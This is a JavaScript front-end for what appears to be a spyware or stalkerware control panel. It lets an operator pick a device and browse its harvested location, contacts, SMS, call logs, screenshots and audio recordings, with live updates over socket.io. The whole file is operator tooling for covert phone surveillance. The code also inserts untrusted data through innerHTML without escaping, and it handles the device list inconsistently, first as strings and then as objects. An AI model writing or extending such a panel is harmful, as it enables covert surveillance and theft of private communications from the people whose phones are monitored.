const socket = io();

// Device selector logic
const deviceSelect = document.getElementById('device-select');
let currentDevice = '';

function fetchDevicesAndPopulate() {
  fetch('/api/devices')
    .then(res => res.json())
    .then(devices => {
      deviceSelect.innerHTML = '<option value="">All Devices</option>' +
        devices.map(d => `<option value="${d}">${d}</option>`).join('');
      if (devices.length && !devices.includes(currentDevice)) {
        currentDevice = '';
      }
    });
}
const deviceInfoDiv = document.getElementById('device-info');

function renderDeviceInfo(deviceId) {
  if (!deviceId) {
    deviceInfoDiv.innerHTML = '<em>Select a device to view its info.</em>';
    return;
  }
  fetch('/api/devices')
    .then(res => res.json())
    .then(devices => {
      const dev = devices.find(d => d.deviceId === deviceId);
      if (!dev || !dev.info || Object.keys(dev.info).length === 0) {
        deviceInfoDiv.innerHTML = '<em>No info available for this device.</em>';
        return;
      }
      deviceInfoDiv.innerHTML = Object.entries(dev.info)
        .map(([k, v]) => `<strong>${k}:</strong> ${v}`).join(' &nbsp;|&nbsp; ');
    });
}

deviceSelect.addEventListener('change', () => {
  currentDevice = deviceSelect.value;
  fetchAllAndRender();
  renderDeviceInfo(currentDevice);
});
fetchDevicesAndPopulate();
setInterval(fetchDevicesAndPopulate, 5000); // refresh device list every 5s
renderDeviceInfo(currentDevice);

// Tab logic
const tabs = document.querySelectorAll('.tab');
const tabSections = document.querySelectorAll('.tab-section');
tabs.forEach(tab => {
  tab.addEventListener('click', () => {
    tabs.forEach(t => t.classList.remove('active'));
    tabSections.forEach(s => s.classList.remove('active'));
    tab.classList.add('active');
    document.getElementById(tab.dataset.tab).classList.add('active');
  });
});

// Theme toggle
const themeToggle = document.getElementById('theme-toggle');
function setTheme(dark) {
  document.body.classList.toggle('dark', dark);
  themeToggle.textContent = dark ? '☀️ Light Mode' : '🌙 Dark Mode';
  localStorage.setItem('theme', dark ? 'dark' : 'light');
}
themeToggle.addEventListener('click', () => setTheme(!document.body.classList.contains('dark')));
setTheme(localStorage.getItem('theme') === 'dark');

// Render helpers
displayTable('location', []);
displayTable('contacts', []);
displayTable('sms', []);
displayTable('calllog', []);
displayScreenshots([]);
displayAudio([]);
displayTable('allData', []);

function renderCell(value) {
  if (Array.isArray(value)) {
    return '<ul>' + value.map(v => `<li>${renderCell(v)}</li>`).join('') + '</ul>';
  } else if (typeof value === 'object' && value !== null) {
    return '<ul>' + Object.entries(value).map(([k, v]) => `<li><strong>${k}:</strong> ${renderCell(v)}</li>`).join('') + '</ul>';
  } else {
    return value !== undefined ? value : '';
  }
}

function displayTable(type, dataArr) {
  const header = document.getElementById(`${type}-header`);
  const body = document.getElementById(`${type}-body`);
  if (!header || !body) return;
  if (!dataArr.length) {
    header.innerHTML = '<th>No data</th>';
    body.innerHTML = '';
    return;
  }
  // Determine columns from all keys
  const columns = Array.from(
    dataArr.reduce((set, row) => {
      Object.keys(row).forEach(k => set.add(k));
      return set;
    }, new Set())
  );
  header.innerHTML = columns.map(col => `<th>${col}</th>`).join('');
  body.innerHTML = dataArr.map(row =>
    `<tr>${columns.map(col => `<td>${renderCell(row[col])}</td>`).join('')}</tr>`
  ).join('');
}

function displayScreenshots(dataArr) {
  const list = document.getElementById('screenshot-list');
  if (!list) return;
  if (!dataArr.length) {
    list.innerHTML = '<p>No screenshots received yet.</p>';
    return;
  }
  list.innerHTML = dataArr.map(item => {
    if (item.image) {
      return `<div><img src="${item.image}" alt="Screenshot" /><div>${item.timestamp || ''}</div></div>`;
    }
    return '';
  }).join('');
}

function displayAudio(dataArr) {
  const list = document.getElementById('audio-list');
  if (!list) return;
  if (!dataArr.length) {
    list.innerHTML = '<p>No audio files uploaded yet.</p>';
    return;
  }
  list.innerHTML = dataArr.map(item =>
    `<div class="audio-item">
      <audio controls src="${item.url}"></audio>
      <a href="${item.url}" download>Download</a>
      <span>${item.timestamp ? new Date(item.timestamp).toLocaleString() : ''}</span>
    </div>`
  ).join('');
}

// Fetch and render all data on load
function fetchAllAndRender() {
  const q = currentDevice ? `?deviceId=${encodeURIComponent(currentDevice)}` : '';
  fetch('/api/location' + q).then(r => r.json()).then(d => displayTable('location', d));
  fetch('/api/contacts' + q).then(r => r.json()).then(d => displayTable('contacts', d));
  fetch('/api/sms' + q).then(r => r.json()).then(d => displayTable('sms', d));
  fetch('/api/calllog' + q).then(r => r.json()).then(d => displayTable('calllog', d));
  fetch('/api/screenshot' + q).then(r => r.json()).then(d => displayScreenshots(d));
  fetch('/api/audio' + q).then(r => r.json()).then(d => displayAudio(d));
  // All Data: merge all types for the device
  if (currentDevice) {
    Promise.all([
      fetch('/api/location' + q).then(r => r.json()),
      fetch('/api/contacts' + q).then(r => r.json()),
      fetch('/api/sms' + q).then(r => r.json()),
      fetch('/api/calllog' + q).then(r => r.json()),
      fetch('/api/screenshot' + q).then(r => r.json()),
      fetch('/api/audio' + q).then(r => r.json())
    ]).then(([loc, con, sms, call, scr, aud]) => {
      const all = [
        ...loc.map(x => ({ type: 'location', ...x })),
        ...con.map(x => ({ type: 'contacts', ...x })),
        ...sms.map(x => ({ type: 'sms', ...x })),
        ...call.map(x => ({ type: 'calllog', ...x })),
        ...scr.map(x => ({ type: 'screenshot', ...x })),
        ...aud.map(x => ({ type: 'audio', ...x }))
      ];
      displayTable('allData', all);
    });
  } else {
    // All devices: show all data
    fetch('/api/location').then(r => r.json()).then(loc =>
      fetch('/api/contacts').then(r => r.json()).then(con =>
        fetch('/api/sms').then(r => r.json()).then(sms =>
          fetch('/api/calllog').then(r => r.json()).then(call =>
            fetch('/api/screenshot').then(r => r.json()).then(scr =>
              fetch('/api/audio').then(r => r.json()).then(aud => {
                const all = [
                  ...loc.map(x => ({ type: 'location', ...x })),
                  ...con.map(x => ({ type: 'contacts', ...x })),
                  ...sms.map(x => ({ type: 'sms', ...x })),
                  ...call.map(x => ({ type: 'calllog', ...x })),
                  ...scr.map(x => ({ type: 'screenshot', ...x })),
                  ...aud.map(x => ({ type: 'audio', ...x }))
                ];
                displayTable('allData', all);
              })
            )
          )
        )
      )
    );
  }
}
fetchAllAndRender();

// Real-time updates
socket.on('init-data', devices => {
  fetchDevicesAndPopulate();
  fetchAllAndRender();
});
['location','contacts','sms','calllog','screenshot','audio'].forEach(type => {
  socket.on('new-' + type, ({ deviceId }) => {
    if (!currentDevice || currentDevice === deviceId) fetchAllAndRender();
  });
});
socket.on('deviceinfo-update', ({ deviceId }) => {
  if (currentDevice === deviceId) renderDeviceInfo(deviceId);
}); 
